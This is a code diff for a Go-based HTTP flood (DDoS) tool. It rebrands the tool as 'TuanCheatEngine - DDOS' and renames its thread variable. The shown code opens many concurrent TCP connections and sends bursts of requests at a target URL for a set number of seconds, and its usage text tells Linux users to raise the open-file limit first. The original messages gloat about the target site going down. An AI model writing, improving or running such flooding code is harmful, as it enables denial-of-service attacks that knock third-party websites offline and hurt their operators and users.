@@ -195,7 +195,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Web sập chắc rồi muhahah!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("TuanCheatEngine - DDOS") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -208,7 +208,7 @@ func flood() {
 			}
 			s.Close()
 		}
-		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
+		//fmt.Println("CDE@", CDE, " Hitting Target -->", url)// For those who like share to skid.
 	}
 }
 
@@ -216,7 +216,7 @@ func main() {
 	if len(os.Args) != 6 {
 		fmt.Println("Post Mode will use TCE.txt as data")
 		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
-		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <TCE.txt>")
+		fmt.Println("Usage: ", os.Args[0], "<url> <CDE> <get/post> <seconds> <TCE.txt>")
 		os.Exit(1)
 	}
 	u, err := url.Parse(os.Args[1])
@@ -239,9 +239,9 @@ func main() {
 		return
 	}
 	mode = os.Args[3]
-	threads, err := strconv.Atoi(os.Args[2])
+	CDE, err := strconv.Atoi(os.Args[2])
 	if err != nil {
-		fmt.Println("Threads should be a integer")
+		fmt.Println("CDE should be a integer")
 	}
 	limit, err := strconv.Atoi(os.Args[4])
 	if err != nil {
@@ -253,10 +253,10 @@ func main() {
 		key = "&"
 	}
 
-	for i := 0; i < threads; i++ {
+	for i := 0; i < CDE; i++ {
 		time.Sleep(time.Microsecond * 100)
-		go flood() // Start threads
-		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
+		go flood() // Start CDE
+		fmt.Printf("\rCDE [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
